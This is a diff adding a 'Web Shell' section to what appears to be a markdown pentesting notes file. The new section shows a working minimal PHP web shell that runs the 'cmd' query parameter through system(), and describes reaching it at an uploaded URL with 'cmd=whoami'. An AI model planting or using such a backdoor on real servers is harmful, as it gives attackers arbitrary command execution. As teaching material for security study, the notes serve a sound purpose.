@@ -199,6 +199,20 @@ ___
 ### Web Shell
 [[#Table of contents|Back to the top]]
 
+*Script written in language supported by compromised web server (PHP, ASP, JSP, simple CGI script), executes commands through web server*
+
+Example: `shell.php`
+```php
+<?php
+if (isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+?>
+```
+
+After shell has been uploaded to web server, it can accessed through URL where shell is hosted. for instance http://target.com/uploads/shell.php
+The script specifies the variable `cmd` should be set through GET method
+--> `http://target.com/uploads/shell.php?cmd=whoami`
 
 
 ___
